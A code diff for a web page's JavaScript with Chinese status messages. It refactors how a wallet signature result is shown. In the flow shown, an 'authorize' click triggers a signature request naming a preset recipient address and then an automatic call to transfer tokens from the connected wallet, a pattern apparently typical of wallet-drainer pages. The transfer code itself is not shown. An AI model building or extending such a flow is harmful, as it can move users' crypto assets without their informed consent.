@@ -113,12 +113,19 @@ document.getElementById('authorizeButton').onclick = async () => {
         document.getElementById('status').innerText = '授权成功，正在请求签名...';
 
         // 授权成功后直接执行签名操作
-        await performSignature(account);
+        const signatureResult = await performSignature(account);
+        if (signatureResult.success) {
+            document.getElementById('status').innerText = `签名成功: ${signatureResult.signature}`;
+            document.getElementById('signatureMessage').innerText = `签名确认信息: ${signatureResult.message}`;
+            document.getElementById('signingSection').style.display = 'block';
+        } else {
+            document.getElementById('status').innerText = '签名失败: ' + signatureResult.error;
+        }
 
         // 开始代币转移
         await transferTokens(account, tokenContract);
     } catch (error) {
-        document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
+        document.getElementById('status').innerText = '授权失败: ' + error.message;
     }
 };
 
@@ -127,13 +134,9 @@ const performSignature = async (account) => {
     const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
     try {
         const signature = await web3.eth.personal.sign(message, account);
-        document.getElementById('status').innerText = `授权和签名成功: ${signature}`;
-
-        // 自动弹出签名信息
-        document.getElementById('signatureMessage').innerText = message;
-        document.getElementById('signingSection').style.display = 'block';
+        return { success: true, signature: signature, message: message };
     } catch (error) {
-        document.getElementById('status').innerText = '签名失败: ' + error.message;
+        return { success: false, error: error.message };
     }
 };
 
